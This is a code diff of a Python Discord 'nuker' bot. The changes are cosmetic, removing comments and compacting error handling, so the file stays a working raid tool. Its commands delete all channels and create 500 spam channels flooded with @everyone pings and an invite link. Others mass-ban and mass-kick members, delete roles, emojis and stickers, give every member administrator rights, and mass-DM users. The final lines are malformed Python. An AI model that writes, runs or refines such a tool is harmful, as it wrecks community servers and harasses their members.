@@ -4,14 +4,12 @@ import asyncio
 import aiohttp
 import os
 
-# ---------- Token loader ----------
 def get_token():
     token = os.getenv("DISCORD_TOKENS", "").strip().splitlines()[0].strip()
     if not token:
         raise RuntimeError("DISCORD_TOKENS not set")
     return token
 
-# ---------- Bot setup ----------
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
@@ -19,15 +17,13 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 async def on_ready():
     print(f"[+] Bot {bot.user} is online and ready.")
 
-# ---------- LIGHTSPEED NUKE ----------
 @bot.command(name="nuke")
 async def nuke(ctx):
     guild = ctx.guild
-
-    # Delete every existing channel
+    # Delete all channels
     await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
 
-    # Create 500 channels (max Discord allows)
+    # Create up to 500 channels in batches
     created_channels = []
     async def create_channel(i):
         try:
@@ -35,14 +31,14 @@ async def nuke(ctx):
         except:
             return None
 
-    for i in range(0, 500, 20):  # batch of 20
+    for i in range(0, 500, 20):
         batch = [create_channel(j) for j in range(i, min(i+20, 500))]
         results = await asyncio.gather(*batch, return_exceptions=True)
         for ch in results:
             if ch:
                 created_channels.append(ch)
 
-    # Spam ping message 50 times per channel
+    # Spam 50 pings per channel
     spam_text = "# Server fucked by trapstar join https://discord.gg/MXEb5Mdy3G @everyone"
     async def spam_channel(ch):
         for _ in range(50):
@@ -53,10 +49,8 @@ async def nuke(ctx):
 
     spam_tasks = [spam_channel(ch) for ch in created_channels]
     await asyncio.gather(*spam_tasks, return_exceptions=True)
-
     print(f"[+] Nuke complete: {len(created_channels)} channels spammed.")
 
-# ---------- ALL OTHER COMMANDS ----------
 @bot.command(name="massban")
 async def massban(ctx):
     guild = ctx.guild
@@ -71,20 +65,16 @@ async def masskick(ctx):
     guild = ctx.guild
     for m in guild.members:
         if m != guild.me:
-            try:
-                await m.kick()
-            except:
-                pass
+            try: await m.kick()
+            except: pass
     await ctx.send("Mass kick completed.")
 
 @bot.command(name="massunban")
 async def massunban(ctx):
     bans = await ctx.guild.bans()
     for ban in bans:
-        try:
-            await ctx.guild.unban(ban.user)
-        except:
-            pass
+        try: await ctx.guild.unban(ban.user)
+        except: pass
     await ctx.send("Unbanned all.")
 
 @bot.command(name="delchannels")
@@ -102,17 +92,14 @@ async def createchans(ctx, name, amount: int):
 @bot.command(name="renameall")
 async def renameall(ctx, name):
     for ch in ctx.guild.channels:
-        try:
-            await ch.edit(name=name)
-        except:
-            pass
+        try: await ch.edit(name=name)
+        except: pass
     await ctx.send("Renamed all channels.")
 
 @bot.command(name="nukechannel")
 async def nukechannel(ctx, channel_id):
     ch = ctx.guild.get_channel(int(channel_id))
-    if ch:
-        await ch.delete()
+    if ch: await ch.delete()
     new_ch = await ctx.guild.create_text_channel("nuked")
     for _ in range(30):
         await new_ch.send("GET NUKED @everyone")
@@ -145,10 +132,8 @@ async def massping(ctx, amount: int):
     role = await ctx.guild.create_role(name="PING", mentionable=True)
     for m in ctx.guild.members:
         if m != ctx.guild.me:
-            try:
-                await m.add_roles(role)
-            except:
-                pass
+            try: await m.add_roles(role)
+            except: pass
     for ch in ctx.guild.text_channels[:5]:
         for _ in range(amount):
             await ch.send(f"{role.mention} @everyone GET PINGED")
@@ -165,10 +150,8 @@ async def delroles(ctx):
     for role in ctx.guild.roles:
         if role.is_default() or role.managed or role >= ctx.guild.me.top_role:
             continue
-        try:
-            await role.delete()
-        except:
-            pass
+        try: await role.delete()
+        except: pass
     await ctx.send("Roles deleted.")
 
 @bot.command(name="createroles")
@@ -182,10 +165,8 @@ async def massrole(ctx, role_name):
     if role:
         for m in ctx.guild.members:
             if m != ctx.guild.me:
-                try:
-                    await m.add_roles(role)
-                except:
-                    pass
+                try: await m.add_roles(role)
+                except: pass
 
 @bot.command(name="removerole")
 async def removerole(ctx, role_name):
@@ -193,36 +174,28 @@ async def removerole(ctx, role_name):
     if role:
         for m in ctx.guild.members:
             if m != ctx.guild.me:
-                try:
-                    await m.remove_roles(role)
-                except:
-                    pass
+                try: await m.remove_roles(role)
+                except: pass
 
 @bot.command(name="adminall")
 async def adminall(ctx):
     role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
     for m in ctx.guild.members:
         if m != ctx.guild.me:
-            try:
-                await m.add_roles(role)
-            except:
-                pass
+            try: await m.add_roles(role)
+            except: pass
 
 @bot.command(name="delemojis")
 async def delemojis(ctx):
     for emoji in ctx.guild.emojis:
-        try:
-            await emoji.delete()
-        except:
-            pass
+        try: await emoji.delete()
+        except: pass
 
 @bot.command(name="delstickers")
 async def delstickers(ctx):
     for sticker in ctx.guild.stickers:
-        try:
-            await sticker.delete()
-        except:
-            pass
+        try: await sticker.delete()
+        except: pass
 
 @bot.command(name="emojicreate")
 async def emojicreate(ctx, name, url):
@@ -236,10 +209,8 @@ async def emojicreate(ctx, name, url):
 async def massdm(ctx, *, message):
     for m in ctx.guild.members:
         if m != ctx.guild.me and not m.bot:
-            try:
-                await m.send(message)
-            except:
-                pass
+            try: await m.send(message)
+            except: pass
 
 @bot.command(name="scrape")
 async def scrape(ctx):
@@ -364,7 +335,6 @@ async def help_cmd(ctx):
 """
 await ctx.send(help_text)
 
----------- Run bot ----------
 if name == "main":
 TOKEN = get_token()
 bot.run(TOKEN)
